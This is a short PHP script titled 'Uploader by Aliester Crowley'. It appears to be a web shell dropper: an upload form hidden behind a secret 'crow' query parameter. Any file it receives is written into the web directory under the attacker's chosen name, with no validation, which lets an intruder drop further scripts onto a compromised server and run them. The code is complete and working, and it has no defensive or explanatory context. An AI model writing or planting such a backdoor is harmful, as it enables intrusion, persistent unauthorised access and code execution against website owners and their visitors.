<?php
if (isset($_FILES['upload'])) {
    $name = $_FILES['upload']['name'];
    $tmp_name = $_FILES['upload']['tmp_name'];
    move_uploaded_file($tmp_name, "./" . $name);
    echo "<h3><a href='./$name'>$name</a></h3>";
}

function displayForm()
{
    ?>
    <!DOCTYPE html>
    <html>
    <body>
    <h1>Uploader by Aliester Crowley</h1>
    <form action=" " method="post" enctype="multipart/form-data">
        Select your file:
        <input type="file" name="upload">
        <input type="submit" value="Upload" name="submit">
    </form>
    </body>
    </html>
    <?php
}

if (isset($_GET['crow'])) {
    displayForm();
}
?>

